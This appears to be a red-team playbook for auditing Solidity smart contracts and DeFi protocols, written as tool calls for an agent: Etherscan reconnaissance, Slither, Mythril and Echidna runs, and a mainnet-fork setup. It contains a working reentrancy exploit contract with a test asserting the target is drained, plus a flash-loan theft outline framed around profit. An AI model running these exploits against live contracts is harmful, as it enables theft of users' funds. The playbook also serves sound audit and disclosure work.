# PLAYBOOK: Web3 & Smart Contract Security
# April 2026 Red Team Stack
# Solidity · EVM · DeFi · NFT · Cross-chain

---

## Web3 Attack Surface

```
SMART CONTRACTS:
  Reentrancy (classic: The DAO $60M, still found in 2026)
  Integer overflow/underflow (pre-SafeMath, Solidity <0.8)
  Access control flaws (missing onlyOwner, wrong modifiers)
  Oracle manipulation (price feed attacks, flash loans)
  Front-running / MEV attacks
  Timestamp dependence
  tx.origin vs msg.sender confusion
  Delegatecall misuse (proxy vulnerabilities)
  Uninitialized storage
  Short address attacks

DEFI PROTOCOL ATTACKS:
  Flash loan attacks (borrow enormous sums within one tx)
  Price oracle manipulation
  Sandwich attacks (MEV)
  Liquidity drain
  Governance attacks (voting manipulation)

WALLET / INFRASTRUCTURE:
  Private key storage (env files, hardcoded keys)
  Phishing (wallet drainer scripts)
  Smart wallet vulnerabilities
```

---

## Tools Setup

```bash
# Foundry (most modern — includes forge, cast, anvil)
curl -L https://foundry.paradigm.xyz | bash
foundryup

# Hardhat (Node.js alternative)
npm install --global hardhat

# Slither (static analysis — most important)
pip install slither-analyzer

# Mythril (formal verification / symbolic execution)
pip install mythril

# Echidna (fuzzing)
# Download from: https://github.com/crytic/echidna

# Manticore (symbolic execution)
pip install manticore

# Tenderly / Foundry fork (mainnet simulation)
# anvil --fork-url [MAINNET_RPC]

# Node.js tools
npm install @openzeppelin/contracts ethers web3 @nomicfoundation/hardhat-toolbox
```

---

## PHASE 1 — CONTRACT RECONNAISSANCE

```bash
# Get contract source (if verified on Etherscan)
kali_exec("curl -s 'https://api.etherscan.io/api?module=contract&action=getsourcecode&address=[CONTRACT_ADDR]&apikey=[KEY]' | python3 -c \"import sys,json; r=json.load(sys.stdin)['result'][0]; print(r['SourceCode'][:2000])\"")

# Get ABI
kali_exec("curl -s 'https://api.etherscan.io/api?module=contract&action=getabi&address=[CONTRACT_ADDR]&apikey=[KEY]' | python3 -c \"import sys,json; print(json.dumps(json.load(sys.stdin)['result'], indent=2))\"")

# If contract is NOT verified → decompile bytecode
# Dedaub decompiler: library.dedaub.com/decompile
# Heimdall: github.com/Jon-Becker/heimdall-rs

# Get all transactions
kali_exec("curl -s 'https://api.etherscan.io/api?module=account&action=txlist&address=[CONTRACT_ADDR]&startblock=0&endblock=99999999&sort=asc&apikey=[KEY]' | python3 -c \"import sys,json; txs=json.load(sys.stdin)['result']; print(f'{len(txs)} transactions'); [print(t['timeStamp'], t['functionName'], t['value']) for t in txs[:10]]\"")

# Check contract balance (has value to extract?)
kali_exec("cast balance [CONTRACT_ADDR] --rpc-url [RPC_URL]")
kali_exec("cast call [CONTRACT_ADDR] 'totalAssets()' --rpc-url [RPC_URL]")
```

---

## PHASE 2 — STATIC ANALYSIS

### Slither (Most Important Tool)
```bash
# Run all detectors
kali_exec("slither [CONTRACT.sol] --print human-summary")
kali_exec("slither [CONTRACT.sol] --detect all --json loot/[MISSION]/web3/slither.json")

# Specific vulnerability checks
kali_exec("slither [CONTRACT.sol] --detect reentrancy-eth,reentrancy-no-eth")
kali_exec("slither [CONTRACT.sol] --detect incorrect-equality,tx-origin,arbitrary-send")
kali_exec("slither [CONTRACT.sol] --detect uninitialized-local,uninitialized-state")

# Contract summary
kali_exec("slither [CONTRACT.sol] --print contract-summary")
kali_exec("slither [CONTRACT.sol] --print call-graph")
kali_exec("slither [CONTRACT.sol] --print inheritance-graph")
```

### Mythril (Symbolic Execution)
```bash
kali_exec("myth analyze [CONTRACT.sol] --solv 0.8.20 -o json > loot/[MISSION]/web3/mythril.json")
kali_exec("myth analyze [CONTRACT_ADDR] --rpc [RPC_URL] --json > loot/[MISSION]/web3/mythril_onchain.json")
```

### Claude Code — LLM Audit
```
Perform a security audit of this Solidity contract.

[PASTE CONTRACT CODE]

Check for ALL of these vulnerability classes:
1. Reentrancy (ETH transfer before state update)
2. Integer overflow/underflow (pre-0.8.0 without SafeMath)
3. Access control (missing modifiers, tx.origin misuse)
4. Oracle/price manipulation (Chainlink vs spot price)
5. Front-running (block timestamp, tx ordering)
6. Flash loan attack surface (large balance changes in 1 tx)
7. Delegatecall storage collision (proxy patterns)
8. Arithmetic precision (division before multiplication)
9. Unchecked return values (ERC20 transfer)
10. Gas limit DoS (unbounded loops, external calls in loops)

For each finding:
- Line number(s)
- Vulnerability type and CWE
- Attack scenario (how would attacker exploit)
- Impact (what can attacker do/steal)
- Fix (exact code change)
```

---

## PHASE 3 — DYNAMIC TESTING (FOUNDRY FORK)

```bash
# Fork mainnet locally for safe testing
kali_exec("anvil --fork-url https://mainnet.infura.io/v3/[KEY] --fork-block-number [BLOCK]")

# Write Foundry test for exploit
kali_write_file("/tmp/ExploitTest.sol", """
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface ITarget {
    function withdraw(uint amount) external;
    function deposit() external payable;
    function balanceOf(address) external view returns (uint);
}

contract ReentrancyExploit {
    ITarget target;
    uint public count;
    
    constructor(address _target) {
        target = ITarget(_target);
    }
    
    function attack() external payable {
        target.deposit{value: msg.value}();
        target.withdraw(msg.value);
    }
    
    receive() external payable {
        if (count < 5 && address(target).balance >= msg.value) {
            count++;
            target.withdraw(msg.value);
        }
    }
}

contract ExploitTest is Test {
    ITarget target = ITarget([TARGET_ADDR]);
    ReentrancyExploit exploit;
    
    function setUp() public {
        // Fork state: target has ETH we can drain
        exploit = new ReentrancyExploit(address(target));
    }
    
    function testReentrancy() public {
        uint startBalance = address(target).balance;
        console.log("Target balance before:", startBalance);
        
        exploit.attack{value: 1 ether}();
        
        uint endBalance = address(target).balance;
        console.log("Target balance after:", endBalance);
        console.log("Drained:", startBalance - endBalance);
        
        assertLt(endBalance, startBalance, "Should have drained funds");
    }
}
""")

kali_exec("cd /tmp && forge test -vvv --fork-url http://localhost:8545 --match-contract ExploitTest")
```

---

## PHASE 4 — COMMON EXPLOIT PATTERNS

### Reentrancy
```solidity
// VULNERABLE:
function withdraw(uint amount) external {
    require(balances[msg.sender] >= amount);
    (bool success, ) = msg.sender.call{value: amount}(""); // ← external call before state update
    require(success);
    balances[msg.sender] -= amount; // ← state update AFTER call
}

// EXPLOIT: malicious receive() calls withdraw() again
// FIX: update state BEFORE external call (CEI pattern)
// OR: add ReentrancyGuard (nonReentrant modifier)
```

### Flash Loan Attack Structure
```javascript
// Using Foundry + Aave flash loan
// 1. Borrow enormous amount (e.g., 100M USDC)
// 2. Manipulate vulnerable protocol's price oracle
// 3. Exploit the price manipulation
// 4. Repay flash loan + fee
// 5. Keep profit
// All in ONE transaction — zero capital needed

// Cost to attempt: ~$50 in gas
// Max potential profit: millions (if protocol is vulnerable)
```

### Price Oracle Manipulation
```bash
# Check if protocol uses on-chain spot price as oracle
kali_exec("cast call [PROTOCOL] 'getPrice()' --rpc-url [RPC]")
# If using Uniswap spot price → manipulable with flash loans
# Fix: use Chainlink TWAP oracles
```

---

## PHASE 5 — AUTOMATED FUZZING

```bash
# Echidna property-based fuzzing
kali_write_file("/tmp/echidna_config.yaml", """
testMode: assertion
testLimit: 50000
corpusDir: corpus
coverage: true
""")

kali_write_file("/tmp/FuzzTest.sol", """
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './Target.sol';

contract FuzzTest is Target {
    // Echidna will call these randomly
    // Property: contract balance should never decrease unexpectedly
    function echidna_balance_invariant() public view returns (bool) {
        return address(this).balance >= initialBalance;
    }
    
    // Property: total supply should never increase beyond max
    function echidna_supply_invariant() public view returns (bool) {
        return totalSupply() <= MAX_SUPPLY;
    }
}
""")

kali_exec("echidna /tmp/FuzzTest.sol --contract FuzzTest --config /tmp/echidna_config.yaml")
```

---

## Evidence

```
loot/[MISSION]/web3/
├── contracts/          # Source code
├── slither.json        # Slither static analysis
├── mythril.json        # Mythril symbolic execution  
├── exploit_pocs/       # Working Foundry test exploits
│   └── *.t.sol
├── audit_report.md     # Consolidated findings
└── impact_calc.md      # Financial impact if exploited
```

---

*April 2026 | Web3 auditing — authorized security research, responsible disclosure to protocol teams*
